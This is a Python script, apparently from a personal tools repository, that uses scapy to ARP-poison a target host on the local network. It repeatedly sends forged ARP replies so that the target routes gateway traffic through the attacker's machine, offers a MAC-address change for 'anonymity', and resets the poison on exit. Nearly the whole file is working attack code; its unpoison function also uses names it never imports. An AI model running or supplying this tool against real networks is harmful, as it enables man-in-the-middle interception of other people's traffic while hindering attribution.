#!/usr/bin/env python

"""
Arp poisons a target; and resets the arp poison on exit.
Uses default interface, router and ip

    usage: arp.py [options]

    optional arguments:
      -h, --help              Show this help message and exit
      -l, --loglevel=X        logging level [default: 10]

      -m, --changemac         Change to random mac address (can take 30 secs)
      -r, --reset             Reset arp poison (should happen on exit anyway)
      -t TARGET, --target     IP address of target [default: 192.168.0.4]
"""
import os
if not os.geteuid()==0:
	exit("\nPlease run as root\n")

from tools.logs import log, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
from scapy.all import send, ARP, sr1
from tools.tools import su, setTitle, fwreset
from tools.bash import arp, route
import time
from docopt import docopt

FREQ = 5

def main():
    args = docopt(__doc__, version='arp 1.0')

    log.setLevel(int(args["--loglevel"]))

    # get router
    r = route()
    if not r.iface or not r.router:
        log.warning("Default route not found")
        sys.exit()
    router = r.router
    iface = r.iface

    # arp reset
    if args["--reset"]:
        unpoison(router, args["--target"])
        fwreset()
        sys.exit()

    # check target is reachable before sending ARP poison. Otherwise scapy sends broadcast ARP poison.
    # Note arp used as ping does not get response from windows machines.
    response = sr1(ARP(pdst=args["--target"]), timeout=2, verbose=0)
    if not response:
        log.info("%s target not found" % args["--target"])
        fwreset()
        sys.exit()

    # change MAC address for extra anonymity
    # only do this if happy to wait 20 seconds to bring network down and up
    if args["--changemac"]:
        su('ifconfig %s down' % iface)
        su('macchanger -r %s' % iface)
        log.info("waiting for network to come back up")
        su('ifconfig %s up' % iface)
        su('dhclient %s' % iface)

    poison(router, args["--target"])
    unpoison(router, args["--target"])
    fwreset()


def poison(src, target):
    """ repeatedly send fake message from router with our MAC address """
    try:
        seconds = 0
        log.info("Starting ARP poison every %s seconds. Router=%s Target=%s" % (FREQ, src, target))
        while 1:
            send(ARP(psrc=src, pdst=target))
            time.sleep(FREQ)
            seconds += FREQ
            log.info("%s seconds elapsed" % seconds)
    except KeyboardInterrupt:
        log.info("Poison interrupted by Ctrl-C")
    except:
        log.info("problem sending arp poison")


def unpoison(router, target):
    """ get correct MAC for router and send to the target to reset ARP cache """
    mac = arp().mac
    # if not already in arp cache then ping and try again
    if router not in mac:
        sr1(IP(dst=router)/ICMP())
        mac = arp().mac
    if router not in mac:
        log.warning("Router MAC address not found. Could not remove ARP poison.")
        sys.exit()
    log.info("Unpoison sent to %s for gateway %s at mac address %s" % (target, router, mac[router]))
    send(ARP(psrc=router, hwsrc=mac[router], pdst=target))

setTitle(__file__)
main()